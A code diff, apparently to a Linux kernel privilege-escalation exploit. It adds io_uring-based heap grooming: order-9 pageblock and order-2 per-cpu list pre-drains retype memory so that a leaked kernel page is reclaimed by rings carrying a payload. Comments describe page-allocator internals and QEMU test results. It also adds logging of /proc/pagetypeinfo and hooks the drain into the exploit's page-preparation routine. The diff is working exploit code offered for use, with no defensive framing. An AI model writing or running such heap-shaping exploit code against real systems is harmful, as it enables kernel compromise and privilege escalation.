@@ -878,7 +878,8 @@ int ring_registry_find(uint64_t value, unsigned off) {
 #define IOURING_SETUP_SYSNR 425
 #define IORING_OFF_SQES 0x10000000ULL
 
-static int iouring_ring_reclaim_one(unsigned char *payload, size_t plen) {
+int iouring_ring_reclaim_one(unsigned char *payload, size_t plen,
+                                    int do_register) {
   unsigned char params[120];
   memset(params, 0, sizeof(params));
   long fd = syscall(IOURING_SETUP_SYSNR, 256, params);
@@ -897,10 +898,64 @@ static int iouring_ring_reclaim_one(unsigned char *payload, size_t plen) {
     close((int)fd);
     return 0;
   }
-  for (size_t off = 0; off + plen <= sqlen; off += 0x4000)
-    memcpy((unsigned char *)sq + off, payload, plen);
-  ring_map_register((unsigned char *)sq, sqlen);
+  if (plen) {
+    for (size_t off = 0; off + plen <= sqlen; off += 0x4000)
+      memcpy((unsigned char *)sq + off, payload, plen);
+  }
+  if (do_register)
+    ring_map_register((unsigned char *)sq, sqlen);
   return 1;
+}
+
+/*
+ * Unmovable pre-drain: the systematic placement failure is structural —
+ * the whole mm-cache neighborhood (~47 slabs, <2MB) sits in ONE
+ * foreign-migratetype pageblock, so the leaked base always frees into
+ * free_list[FOREIGN][2] where GFP_KERNEL claims never reach (QEMU
+ * pagetypeinfo-proven). Draining free_list[UNMOVABLE] BEFORE the child
+ * spray turns every new mm slab page into a fallback steal — the buddy
+ * RETYPES the stolen pageblock UNMOVABLE — so the entire spray region
+ * (incl. base) later frees into the unmovable lists our rings claim.
+ * These drainer rings carry no payload and are not registered.
+ */
+/* entries=32768 -> SQE array = 2MB = one full pageblock (order-9).
+ * Full-pageblock UNMOVABLE allocations force fallback steals that RETYPE
+ * the stolen pageblock UNMOVABLE (can_steal: order >= pageblock/2) --
+ * order-2 allocations never retype, so order-2 pre-drains are useless. */
+static int iouring_pageblock_ring_one(void) {
+  unsigned char params[120];
+  memset(params, 0, sizeof(params));
+  long fd = syscall(IOURING_SETUP_SYSNR, 32768, params);
+  if (fd < 0)
+    return 0;
+  return 1; /* fd leaked; SQE mmap not needed for the drain */
+}
+
+static void unmovable_pre_drain(void) {
+  int n = env_int_range("PRE_DRAIN_BLOCKS", 16, 0, 128);
+  int pcp = env_int_range("PRE_DRAIN_PCP", 96, 0, 512);
+  if (n <= 0 && pcp <= 0)
+    return;
+  int ok = 0;
+  for (int i = 0; i < n; i++) {
+    if (!iouring_pageblock_ring_one())
+      break;
+    ok++;
+  }
+  /* PCP flush: the order-2 per-cpu list is TYPE-BLIND and serves mm slab
+   * allocations before the buddy - stale boot-era PCP pages put the leak
+   * child's slab in a foreign pageblock (QEMU: 429 clean unmovable o2 in
+   * the buddy, yet base still foreign). A SMALL order-2 drain (~96, well
+   * under the buddy inventory) empties the PCP so the spray draws clean
+   * unmovable buddy pages. Do NOT drain the buddy o2 itself. */
+  int okp = 0;
+  for (int i = 0; i < pcp; i++) {
+    if (!iouring_ring_reclaim_one(NULL, 0, 0))
+      break;
+    okp++;
+  }
+  pr_info("PRE_DRAIN: %d pageblock(order-9) retype + %d o2 PCP-flush rings\n",
+          ok, okp);
 }
 
 static int iouring_ring_reclaim(unsigned char *payload, size_t plen) {
@@ -909,7 +964,7 @@ static int iouring_ring_reclaim(unsigned char *payload, size_t plen) {
   int n = env_int_range("IOURING_RINGS", 64, 1, 512);
   int ok = 0;
   for (int i = 0; i < n; i++) {
-    if (!iouring_ring_reclaim_one(payload, plen))
+    if (!iouring_ring_reclaim_one(payload, plen, 1))
       break;
     ok++;
   }
@@ -927,6 +982,17 @@ static int packet_ring_reclaim(unsigned char *payload, size_t plen) {
   char b0[512] = {0};
   read_first_line("/proc/buddyinfo", b0, sizeof(b0));
   pr_info("BUDDY before rings: %.400s", b0);
+  {
+    FILE *pf = fopen("/proc/pagetypeinfo", "r");
+    if (pf) {
+      char l[256];
+      while (fgets(l, sizeof(l), pf)) {
+        if (strstr(l, "DMA32"))
+          pr_info("PAGETYPE_PRE %.200s", l);
+      }
+      fclose(pf);
+    }
+  }
   int ok = 0;
   static const unsigned orders[] = {2, 3, 4, 5};
   unsigned defblocks = (unsigned)env_int_range("PACKET_BLOCKS", 16, 1, 512);
@@ -1571,6 +1637,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   skb_buf = malloc(SKB_SEND_SIZE);
   memset(skb_buf, 0x41, SKB_SEND_SIZE);
+
+  unmovable_pre_drain();
 
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     prepare_ctx.childs[i] = clone_child();
